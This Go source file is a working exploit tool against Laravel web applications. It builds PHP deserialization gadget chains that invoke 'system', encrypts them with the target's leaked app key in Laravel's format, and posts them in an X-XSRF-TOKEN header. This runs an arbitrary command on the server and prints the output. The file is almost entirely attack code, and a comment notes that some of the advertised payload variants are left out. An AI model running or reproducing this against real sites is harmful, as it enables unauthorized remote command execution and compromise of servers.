package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

type CryptoData struct {
	Iv    string `json:"iv"`
	Value string `json:"value"`
	Mac   string `json:"mac"`
}

func generateEncryptedData(cmd string, key string, method int) string {
	var decodedData string
	switch method {
	case 1:
		decodedData = fmt.Sprintf(`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"%s*%sevents";O:15:"Faker\Generator":1:{s:13:"%s*%sformatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"%s*%sevent";s:%d:"%s";}`, "\x00", "\x00", "\x00", "\x00", "\x00", "\x00", len(cmd), cmd)
	// omitiendo otros casos por brevedad
	default:
		decodedData = fmt.Sprintf(`O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"%s*%sevents";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"%s*%sevent";s:%d:"%s";}`, "\x00", "\x00", "\x00", "\x00", len(cmd), cmd)
	}

	value := base64.StdEncoding.EncodeToString([]byte(decodedData))
	decodedKey, _ := base64.StdEncoding.DecodeString(key)
	encryptedData, err := encode(value, decodedKey)
	if err != nil {
		fmt.Println("Error:", err)
		return ""
	}
	return encryptedData
}

func encode(text string, key []byte) (string, error) {
	decodedText, _ := base64.StdEncoding.DecodeString(text)
	cipherBlock, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}

	blockSize := cipherBlock.BlockSize()
	origData := []byte(decodedText)
	pad := blockSize - len(origData)%blockSize
	origData = append(origData, bytes.Repeat([]byte{byte(pad)}, pad)...)

	mode := cipher.NewCBCEncrypter(cipherBlock, iv)

	encryptedText := make([]byte, len(origData))
	mode.CryptBlocks(encryptedText, origData)

	payload := base64.StdEncoding.EncodeToString(encryptedText)
	ivBase64 := base64.StdEncoding.EncodeToString(iv)

	hash := hmac.New(sha256.New, key)
	hash.Write([]byte(ivBase64 + payload))
	hashedMac := hash.Sum(nil)

	cryptoData := CryptoData{Iv: ivBase64, Value: payload, Mac: fmt.Sprintf("%x", hashedMac)}
	jsonData, _ := json.Marshal(cryptoData)
	encodedData := base64.StdEncoding.EncodeToString(jsonData)
	return encodedData, nil
}

func parseResponse(resp string) string {
	return strings.Split(resp, "<!DOCTYPE html>")[0]
}

func executeAttack(targetURL string, apiKey string, cmd string, method int) (string, error) {
	encryptedData := generateEncryptedData(cmd, apiKey, method)
	if encryptedData == "" {
		return "", errors.New("Failed to generate encrypted data")
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", targetURL, nil)
	if err != nil {
		return "", err
	}

	req.Header.Set("X-XSRF-TOKEN", encryptedData)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	targetURL := flag.String("URL", "", "Target Laravel website URL")
	apiKey := flag.String("API_KEY", "", "API key of the Laravel website, base64-encoded")
	command := flag.String("command", "uname -a", "Command to execute on the vulnerable website; defaults to 'uname -a' if unspecified")
	method := flag.Int("method", 1, "Indicates which deserialized payload version to use: 1 = Laravel RCE1 (default), 2 = Laravel RCE2, 3 = Laravel RCE3, 4 = Laravel RCE4")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	response, err := executeAttack(*targetURL, *apiKey, *command, *method)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	fmt.Println("\n" + parseResponse(response))
}
